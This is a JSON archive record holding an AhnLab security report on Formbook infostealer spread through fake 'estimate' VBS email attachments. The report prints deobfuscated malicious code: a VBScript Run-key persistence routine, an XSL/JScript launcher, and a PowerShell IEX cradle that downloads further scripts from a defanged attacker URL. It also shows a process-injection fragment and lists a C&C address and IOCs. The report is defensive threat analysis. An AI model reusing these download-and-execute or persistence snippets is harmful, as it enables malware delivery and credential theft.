{
    "id": "b06a4fce-d4ba-4e54-a4bc-6a8d7aa28455",
    "created_at": "2023-01-12T15:05:20.928262Z",
    "updated_at": "2025-03-27T02:05:30.017696Z",
    "deleted_at": null,
    "sha1_hash": "117f35a4636900f8c2d255a1a608b48a82446ee7",
    "title": "2022-02-28 - Change in Distribution Method of Malware Disguised as Estimate (VBS Script)",
    "authors": "",
    "file_creation_date": "2022-05-28T23:22:08Z",
    "file_modification_date": "2022-05-28T23:22:08Z",
    "file_size": 780586,
    "plain_text": "# Change in Distribution Method of Malware Disguised as Estimate (VBS Script)\n\n**asec.ahnlab.com/en/32149/**\n\nFebruary 28, 2022\n\nLast year, the ASEC analysis team has discovered the distribution of Formbook that used a\ncertain company’s name in its filename. Recently, the team has discovered that it is being\ndistributed via VBS file. The email used for distribution still contains details about a request\nfor an estimate, and by using a certain company’s name in the attachment, it prompts the\nuser to execute it.\n\n\n-----\n\nFigure 1. Email 1\n\n\n-----\n\nFigure 2. Email 2\nThe compressed file attached to the email does not contain an executable but a VBS file.\n\nFigure 3. Inside the attached compressed file\n\n\n-----\n\nAll the malicious files that are being distributed are using the same company s name with\ndifferent dates, and dates differ by the distribution date. The names of the files that have\nbeen discovered so far are as follows;\n\nKor***IndustryDevelopment(2022.02.03).pdf.vbs\nKor***IndustryDevelopment(2022.02.04).pdf.vbs\nKor***IndustryDevelopment(2022.02.07).pdf.vbs\nKor***IndustryDevelopment(2022-02-10).pdf.vbs\nKor***IndustryDevelopment(2022.02.16).pdf.vbs\nKor***IndustryDevelopment(2022.02.17).pdf.vbs\nKor***IndustryDevelopment(2022.02.21).pdf.vbs\n\nCertain values are obfuscated in Kor***IndustryDevelopment(2022.02.21).pdf.vbs. When\nunobfuscated, it shows the code that performs the feature of registering to Run Key and\naccessing a certain URL.\n```\nSub eQACeDnGd()\nConst zTZPNQXZ = &H80000001\nSet izXSnKvcF=Eval(\"GetObject(WSBI() + \"\"default:StdRegProv\"\")\")\nCso = \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nFklft = \"jtZsps\"\nXqTs = \"C:\\Users\\[UserName]\\Music\\\" + [Script filename]\nizXSnKvcF.SetStringValue zTZPNQXZ,Cso,Fklft,XqTs\nEnd Sub\nSub FRgMMrSnNR()\nOn Error Resume Next\n Set uVzfiIPoT = Eval(\"GetObject(new:F5078F32-C551-11D3-89B9-0000F81FE221)\")\n'MSXML2.DOMDocument.3.0의 CLASSID\n uVzfiIPoT.async = False\n Execute(\"uVzfiIPoT.Load hxxp://wisewomanwarrior[.]com/wp-admin/self2.jpg\")\n Execute(\"uVzfiIPoT.transformNode (uVzfiIPoT)\")\nEnd Sub\n\n```\nUpon executing the VBS file, it accesses hxxp://wisewomanwarrior[.]com/wp-admin/self2.jpg,\nand executes the additional script that exists in this URL. It then adds C:\\Users\\\n\n[UserName]\\Music\\Kor***IndustryDevelopment(2022.02.21).pdf.vbs to\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\jtZsps registry to enable the\nmalicious script for it execute consistently.\n\nIt also performs the command below to self-copy under the same filename into the C:\\Users\\\n\n[UserName]\\Music\\ folder that is added to the registry.\n\ncmd /c copy “Kor***IndustryDevelopment(2022.02.21).pdf.vbs” “C:\\Users\\\n\n[UserName]\\Music” /Y\n\nThe script code below exists in hxxp://wisewomanwarrior[.]com/wp-admin/self2.jpg, and\nwhen accessing this URL, powershell is executed.\n\n\n-----\n\n```\n<xsl:stylesheet version 1.0 \n   xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n   xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n   xmlns:user=\"http://mycompany.com/mynamespace\">\n <msxsl:script language=\"JScript\" implements-prefix=\"user\">\n<![CDATA[\n-omittedvar\nyy=r.ShellExecute(\"powershell.exe\",eioerhidfsg44g00ggg(\"2474303D27444535272E7265706C61\n-omitted<em>function</em> eioerhidfsg44g00ggg(hex) {\n  var str = '';\n  for (var i = 0; i < hex.length; i += 2) {\n    var v = parseInt(hex.substr(i, 2), 16);\n    if (v) str += String.fromCharCode(v);\n  }\n  return str;\n}\n\n```\nThe obfuscated powershell command ultimately performs the command below and\ndownloads additional scripts from hxxp://wisewomanwarrior[.]com/wp-admin/self1.jpg.\n```\n$t0='IEX';\nsal g $t0;\n$gf=\"$ErrorActionPreference = 'SilentlyContinue';\n$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);\n[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;\nAdd-Type -AssemblyName Microsoft.VisualBasic;do {$ping = test-connection -comp\ngoogle.com -count 1 -Quiet} until ($ping);\n$tty=g('(New-Object Net.WebClient)');\n$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'DownloadString',\n[Microsoft.VisualBasic.CallType]::Method,'hxxp://wisewomanwarrior[.]com/wpadmin/self1.jpg')|g\" | %{\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };\ng([system.String]::Join('', $gf))\n\n```\nHxxp://wisewomanwarrior[.]com/wp-admin/self1.jpg contains obfuscated powershell\ncommand and compressed file data. This script decompresses the data and injects it into a\ncertain process.\n```\n$eqCH=(01100110,01110101,01101110,01100011,<omitted>,01111101) | %{\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2))\n};I`E`X([system.String]::Join('', $eqCH)) ‘Decompressing-related powershell script\n[Byte[]]$MNB=('_<1F,_<8B,_<08, <omitted>,_<00'.replace('_<','0x'))|g;\n[byte[]]$FFCgPVE = tMCfkSD $MNB\n[Byte[]]$uiMz=('_<1F,_<8B,_<08, <omitted>,_<02,_<00'.replace('_<','0x'))|g\n$ayy =\n[Microsoft.VisualBasic.Interaction]::CallByname([AppDomain]::CurrentDomain,\"Load\",\n[Microsoft.VisualBasic.CallType]::Method,$FFCgPVE)\n[toooyou]::Black('calc.exe',$uiMz)\n\n```\n\n-----\n\nUpon executing the script above, it uses the function inside the .Net executable that is saved\nto the $MNB variable to inject the data inside $uiMz to calc.exe.\n\nFigure 4. Process tree shown via AhnLab’s RAPIT system\nThe injected data is the Formbook infostealer. It operates by injecting into the normal\nprocess explorer.exe and another normal process in system32 path and steals user\ncredentials via C&C connection.\n\nC&C : hxxp://www.bumabagi[.]com/p7n9/\n\nMalware disguised as an estimate has been consistently distributed from the past, so user\ncaution is necessary. As the malicious files are disguised under the name of actual\ncompanies as shown above, users must check the sender and refrain from executing links or\nattachments in emails from unknown senders.\n\nAhnLab’s anti-malware software detects and blocks the malware using the aliases below.\n\n**[Behavior and Memory Detection]**\n\n\n-----\n\nMalware/MDP.Inject.M3044\nMalware/MDP.Inject.M3509\nRansom/MDP.BlueCrab.M3544\nTrojan/Win.Formbook.XM89\n\n**[File Detection]**\n\nDownloader/VBS.Generic\n\n**[IOC Info]**\n\nf7918d4a953248d4878f0332bd235a53 (VBS)\n23c238466940b27bf287dccaf3407923 (VBS)\ncdfbfe783f4b40bdb86c1ac3bc126596 (VBS)\nhxxp://wisewomanwarrior[.]com/wp-admin/self2.jpg\nhxxp://wisewomanwarrior[.]com/wp-admin/self2.jpg\nhxxp://www.bumabagi[.]com/p7n9/\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n[Tagged as:Estimate,](https://asec.ahnlab.com/tag/estimate/) [Formbook,](https://asec.ahnlab.com/en/tag/formbook-en/) [VBScript](https://asec.ahnlab.com/en/tag/vbscript-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-28 - Change in Distribution Method of Malware Disguised as Estimate (VBS Script).pdf"
    ],
    "report_names": [
        "2022-02-28 - Change in Distribution Method of Malware Disguised as Estimate (VBS Script).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535920,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653780128,
    "ts_modification_date": 1653780128,
    "files": {
        "pdf": "https://archive.orkl.eu/117f35a4636900f8c2d255a1a608b48a82446ee7.pdf",
        "text": "https://archive.orkl.eu/117f35a4636900f8c2d255a1a608b48a82446ee7.txt",
        "img": "https://archive.orkl.eu/117f35a4636900f8c2d255a1a608b48a82446ee7.jpg"
    }
}